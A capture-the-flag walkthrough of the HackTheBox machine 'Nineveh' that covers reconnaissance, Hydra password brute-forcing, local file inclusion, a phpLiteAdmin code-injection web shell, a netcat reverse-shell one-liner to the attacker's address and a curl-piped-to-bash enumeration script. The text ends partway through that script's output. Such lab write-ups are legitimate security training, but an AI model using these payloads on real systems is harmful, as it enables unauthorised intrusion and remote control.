#### Nineveh

- [Attacker Info]()
- [Nmap Scan]()
- [Gobuster]()
- [Hydra]()
- [phpliteadmin Exploitation]()
- [Privilege Escalation using chkrootkit (enumerating processes)]()
- [Privilege Escalation using knockd]()

###### Attacker Info

```sh
root@kali:~/nineveh# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.19  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fef1:8ebf  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:f1:8e:bf  txqueuelen 1000  (Ethernet)
        RX packets 408  bytes 67465 (65.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 266  bytes 45333 (44.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 1272 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1272 (1.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.6  netmask 255.255.254.0  destination 10.10.14.6
        inet6 dead:beef:2::1004  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::b0e1:d917:fdb5:b294  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 3  bytes 252 (252.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10  bytes 624 (624.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~/nineveh#
```

###### Nmap Scan

```sh
root@kali:~/nineveh# nmap -sV -sC -oA nineveh.nmap 10.10.10.43

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 01:21 EST
Nmap scan report for 10.10.10.43
Host is up (0.22s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.22 seconds
root@kali:~/nineveh#
```

```sh
root@kali:~# nano /etc/hosts
root@kali:~# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

10.10.10.43     nineveh.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
root@kali:~#
```

```
http://10.10.10.43
```

![](images/1.png)

```
https://10.10.10.43
```

![](images/2.png)

![](images/3.png)

###### Gobuster

```sh
root@kali:~/nineveh# gobuster -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.43/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 307,200,204,301,302
[+] Expanded     : true
=====================================================
http://10.10.10.43/department (Status: 301)
```

```sh
root@kali:~/nineveh# gobuster -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.43/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 307,200,204,301,302
[+] Expanded     : true
=====================================================
https://10.10.10.43/db (Status: 301)
https://10.10.10.43/secure_notes (Status: 301)
```

```
http://10.10.10.43/department/login.php
```

![](images/4.png)

```
https://10.10.10.43/db/
```

![](images/5.png)

###### Hydra

```sh
root@kali:~/nineveh# git clone https://github.com/danielmiessler/SecLists.git
Cloning into 'SecLists'...
remote: Counting objects: 1891, done.
remote: Compressing objects: 100% (25/25), done.
remote: Total 1891 (delta 46), reused 65 (delta 46), pack-reused 1817
Receiving objects: 100% (1891/1891), 432.97 MiB | 7.11 MiB/s, done.
Resolving deltas: 100% (886/886), done.
root@kali:~/nineveh# cd SecLists/
root@kali:~/nineveh/SecLists# ls
Discovery  Fuzzing  IOCs  Miscellaneous  OLDREADME.md  Passwords  Pattern_Matching  Payloads  README.md  Usernames
root@kali:~/nineveh/SecLists# cd Passwords/
root@kali:~/nineveh/SecLists/Passwords# ls
 10k_most_common.txt                       bible-withcount.txt          hak5.txt                      myspace.txt                     rockyou-30.txt              splashdata_2015.txt
 10_million_password_list_top_100000.txt   carders.cc.txt               hak5-withcount.txt            myspace-withcount.txt           rockyou-35.txt              SplashData-2015.txt
 10_million_password_list_top_10000.txt    common-passwords-win.txt     hotmail.txt                   password-permutations.txt       rockyou-40.txt              Sucuri_Top_Wordpress_Passwords.txt
 10_million_password_list_top_1000.txt     conficker.txt                john.txt                      passwords_clarkson_82.txt       rockyou-45.txt              top-20-common-SSH-passwords
 10_million_password_list_top_100.txt      darkweb2017_top100.txt       KeyboardCombinations.txt      passwords_john.txt              rockyou-50.txt              top_shortlist.txt
 10_million_password_list_top_500.txt      darkweb2017_top10K.txt       korelogic-password.txt        passwords_youporn2012_raw.txt   rockyou-55.txt              tuscl.txt
 1337speak.txt                             darkweb2017_top10.txt        Lizard_Squad.txt              passwords_youporn2012.txt       rockyou-5.txt               twitter-banned.txt
 500-worst-passwords.txt                   darkweb2017_top1K.txt        medical_devices.txt           porn-unknown.txt                rockyou-60.txt              UserPassJay.txt
 adobe100.txt                             'default-passwords 2.csv'     mil-dic.txt                   porn-unknown-withcount.txt      rockyou-65.txt              wordpress_attacks_july2014.txt
 Basic_Spanish_List.txt                   'default-passwords 3.csv'     mirai_botnet.txt              README                          rockyou-70.txt
 best1050.txt                              elitehacker.txt              MostPopularLetterPasses.txt   rockyou-10.txt                  rockyou-75.txt
 best110.txt                               elitehacker-withcount.txt    mubix_izmy.txt                rockyou-15.txt                  singles.org.txt
 best15.txt                                faithwriters.txt             muslimMatch.txt               rockyou-20.txt                  singles.org-withcount.txt
 bible.txt                                 faithwriters-withcount.txt   muslimMatch-withCount.txt     rockyou-25.txt                  splashdata_2014.txt
root@kali:~/nineveh/SecLists/Passwords# less 10k_most_common.txt
```

```sh
root@kali:~/nineveh# hydra -l admin -P SecLists/Passwords/10k_most_common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-01-26 01:59:50
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:0), ~10000 tries per task
[DATA] attacking http-post-form://10.10.10.43:80//department/login.php:username=^USER^&password=^PASS^:Invalid
[STATUS] 2498.00 tries/min, 2498 tries in 00:00h, 0 to do in 01:00h, 7502 active
[STATUS] 2575.67 tries/min, 7727 tries in 00:00h, 0 to do in 03:00h, 2273 active
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 64 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2018-01-26 02:03:37
root@kali:~/nineveh#
```

```
http://10.10.10.43/department/login.php
```

```
admin
1q2w3e4r5t
```

```
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt
```

![](images/10.png)

![](images/11.png)

```
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.t
```

![](images/12.png)

```
http://10.10.10.43/department/manage.php?notes=php://filter/convert.base64encode/resource=files/ninevehNotes.txt
```

![](images/13.png)

```
https://10.10.10.43/db/
```

![](images/8.png)

![](images/9.png)

```sh
root@kali:~/nineveh# hydra -l admin -P SecLists/Passwords/10k_most_common.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-01-26 02:08:25
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:0), ~10000 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443//db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect
[STATUS] 825.00 tries/min, 825 tries in 00:00h, 0 to do in 01:00h, 9175 active
[STATUS] 832.00 tries/min, 2496 tries in 00:00h, 0 to do in 03:00h, 7504 active
[STATUS] 839.00 tries/min, 5873 tries in 00:00h, 0 to do in 07:00h, 4127 active
[STATUS] 833.33 tries/min, 10000 tries in 00:00h, 0 to do in 12:00h, 1 active
1 of 1 target completed, 0 valid passwords found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 64 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2018-01-26 02:20:26
root@kali:~/nineveh#
```

```sh
root@kali:~/nineveh# grep -i ^password /usr/share/wordlists/rockyou.txt > pw
root@kali:~/nineveh# less pw
```

```sh
root@kali:~/nineveh# hydra -l admin -P pw 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-01-26 02:40:22
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 2930 login tries (l:1/p:0), ~2930 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443//db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 64 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2018-01-26 02:40:43
root@kali:~/nineveh#
```

```
https://10.10.10.43/db/
```

```
password123
```

![](images/14.png)

###### phpliteadmin Exploitation

```sh
root@kali:~/nineveh# searchsploit phpliteadmin

-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                                                                      | exploits/php/webapps/24044.txt
phpLiteAdmin - 'table' SQL Injection                                                                                                                                | exploits/php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                                                                         | exploits/php/webapps/37515.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                                                                       | exploits/php/webapps/39714.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
Shellcodes: No Result
root@kali:~/nineveh#
```

```24044.txt```

```
# Exploit Title: phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
# Google Dork: inurl:phpliteadmin.php (Default PW: admin)
# Date: 01/10/2013
# Exploit Author: L@usch - http://la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt
# Vendor Homepage: http://code.google.com/p/phpliteadmin/
# Vendor Status: Informed
# Software Link: http://phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip
# Version: 1.9.3
# Tested on: Windows and Linux

Description:

phpliteadmin.php#1784: 'Creating a New Database' =>
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php

Done!

Proof: http://goo.gl/ZqPVL
```

![](images/15.png)

```php
<?php echo system($_REQUEST['cmd']); ?>
```

![](images/16.png)

![](images/17.png)

![](images/18.png)

![](images/19.png)

```
http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=ls
```

![](images/20.png)

```php
<?php echo system($_REQUEST["cmd"]); ?>
```

![](images/21.png)

![](images/22.png)

![](images/23.png)

[``Reverse Shell Cheat Sheet``](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 8090 >/tmp/f
```

![](images/24.png)

![](images/25.png)

[``Method 3: Upgrading from netcat with magic``](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic)

```sh
root@kali:~/nineveh# nc -nlvp 8090
listening on [any] 8090 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.43] 38948
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@nineveh:/var/www/html/department$ ^Z
[1]+  Stopped                 nc -nlvp 8090
root@kali:~/nineveh# echo $TERM
xterm-256color
root@kali:~/nineveh# stty -a
speed 38400 baud; rows 51; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@kali:~/nineveh# stty raw -echo
root@kali:~/nineveh# nc -nlvp 8090

www-data@nineveh:/var/www/html/department$ stty rows 51 columns 204
www-data@nineveh:/var/www/html/department$
```

###### Privilege Escalation using chkrootkit (enumerating processes)

```sh
root@kali:~/nineveh# git clone https://github.com/rebootuser/LinEnum.git
Cloning into 'LinEnum'...
remote: Counting objects: 98, done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 98 (delta 4), reused 8 (delta 4), pack-reused 86
Unpacking objects: 100% (98/98), done.
root@kali:~/nineveh# cd LinEnum/
root@kali:~/nineveh/LinEnum# ls -l
total 52
-rw-r--r-- 1 root root  2784 Jan 26 03:22 CHANGELOG.md
-rw-r--r-- 1 root root   418 Jan 26 03:22 CONTRIBUTORS.md
-rwxr-xr-x 1 root root 38174 Jan 26 03:22 LinEnum.sh
-rw-r--r-- 1 root root  3384 Jan 26 03:22 README.md
root@kali:~/nineveh/LinEnum#
```

```sh
root@kali:~/nineveh/LinEnum# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.43 - - [26/Jan/2018 03:25:37] "GET /LinEnum.sh HTTP/1.1" 200 -
```

```sh
www-data@nineveh:/var/www/html/department$ curl http://10.10.14.6/LinEnum.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 38174  100 38174    0     0  46583      0 --:--:-- --:--:-- --:--:-- 46553

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
#

Debug Info
thorough tests = disabled


Scan started at:
Fri Jan 26 02:25:56 CST 2018


### SYSTEM ##############################################
Kernel information:
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


Kernel information (continued):
Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017


Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


Hostname:
nineveh


### USER/GROUP ##########################################
Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Sat Aug  5 10:16:49 -0500 2017
amrois           pts/0    192.168.0.14     Mon Jul  3 00:19:59 -0500 2017


Who else is logged on:
 02:25:56 up 12:02,  0 users,  load average: 0.00, 0.24, 0.44
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(mysql) gid=111(mysql) groups=111(mysql)
uid=108(messagebus) gid=112(messagebus) groups=112(messagebus)
uid=109(uuidd) gid=113(uuidd) groups=113(uuidd)
uid=110(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)

Seems we met some admin users!!!

uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)



Sample entires from /etc/passwd (searching for uid values 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002):
root:x:0:0:root:/root:/bin/bash
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash


Super user account(s):
root


Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root   root   4.0K Jul  2  2017 .
drwxr-xr-x 24 root   root   4.0K Jul  2  2017 ..
drwxr-xr-x  4 amrois amrois 4.0K Jul  3  2017 amrois


### ENVIRONMENTAL #######################################
 Environment information:
APACHE_PID_FILE=/var/run/apache2/apache2.pid
APACHE_RUN_USER=www-data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html/department
LANG=C
APACHE_RUN_GROUP=www-data
SHLVL=2
APACHE_RUN_DIR=/var/run/apache2
APACHE_LOCK_DIR=/var/lock/apache2
_=/usr/bin/env


Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen


Current umask value:
0022
u=rwx,g=rx,o=rx


umask value as specified in /etc/login.defs:
UMASK		022


Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Jul  2  2017 .
drwxr-xr-x 93 root root 4096 Aug  5 10:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Jul  2  2017 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Jul  2  2017 .
drwxr-xr-x 93 root root 4096 Aug  5 10:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jul  2  2017 .
drwxr-xr-x 93 root root 4096 Aug  5 10:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jul  2  2017 .
drwxr-xr-x 93 root root 4096 Aug  5 10:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Jul  2  2017 .
drwxr-xr-x 93 root root 4096 Aug  5 10:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common


Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
Network & IP info:
ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:48:f7
          inet addr:10.10.10.43  Bcast:10.10.10.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2405488 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1828746 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:226071184 (226.0 MB)  TX bytes:903136301 (903.1 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:9626 errors:0 dropped:0 overruns:0 frame:0
          TX packets:9626 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:777790 (777.7 KB)  TX bytes:777790 (777.7 KB)


ARP history:
? (10.10.10.2) at 00:50:56:aa:d8:f7 [ether] on ens33
? (10.10.10.51) at 00:50:56:b9:4d:4f [ether] on ens33


Nameserver(s):
nameserver 8.8.8.8
nameserver 8.8.4.4


Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33


Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0    112 10.10.10.43:38948       10.10.14.6:8090         ESTABLISHED 2414/nc
tcp        0      0 10.10.10.43:443         10.10.14.6:40516        ESTABLISHED -
tcp        0      0 10.10.10.43:443         10.10.14.6:40520        ESTABLISHED -
tcp        0      0 10.10.10.43:443         10.10.14.6:40518        ESTABLISHED -
tcp        0      0 10.10.10.43:443         10.10.14.6:40512        ESTABLISHED -
tcp        0      0 10.10.10.43:443         10.10.14.6:40522        ESTABLISHED -
tcp        0      0 10.10.10.43:443         10.10.14.6:40514        ESTABLISHED -
tcp        0      0 10.10.10.43:443         10.10.14.6:40524        ESTABLISHED -
tcp6       0      0 :::22                   :::*                    LISTEN      -


Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 10.10.10.43:45896       8.8.8.8:53              ESTABLISHED -


### SERVICES #############################################
Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.5  38160  6084 ?        Ss   Jan25   0:03 /sbin/init
root         2  0.0  0.0      0     0 ?        S    Jan25   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Jan25   0:10 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   Jan25   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    Jan25   0:08 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    Jan25   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    Jan25   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    Jan25   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    Jan25   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   Jan25   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   Jan25   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    Jan25   0:00 [khungtaskd]
root        15  0.0  0.0      0     0 ?        S<   Jan25   0:00 [writeback]
root        16  0.0  0.0      0     0 ?        SN   Jan25   0:00 [ksmd]
root        17  0.0  0.0      0     0 ?        SN   Jan25   0:00 [khugepaged]
root        18  0.0  0.0      0     0 ?        S<   Jan25   0:00 [crypto]
root        19  0.0  0.0      0     0 ?        S<   Jan25   0:00 [kintegrityd]
root        20  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        21  0.0  0.0      0     0 ?        S<   Jan25   0:00 [kblockd]
root        22  0.0  0.0      0     0 ?        S<   Jan25   0:00 [ata_sff]
root        23  0.0  0.0      0     0 ?        S<   Jan25   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   Jan25   0:00 [devfreq_wq]
root        28  0.0  0.0      0     0 ?        S    Jan25   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        S<   Jan25   0:00 [vmstat]
root        30  0.0  0.0      0     0 ?        S    Jan25   0:00 [fsnotify_mark]
root        31  0.0  0.0      0     0 ?        S    Jan25   0:00 [ecryptfs-kthrea]
root        47  0.0  0.0      0     0 ?        S<   Jan25   0:00 [kthrotld]
root        48  0.0  0.0      0     0 ?        S<   Jan25   0:00 [acpi_thermal_pm]
root        49  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        50  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        51  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        52  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
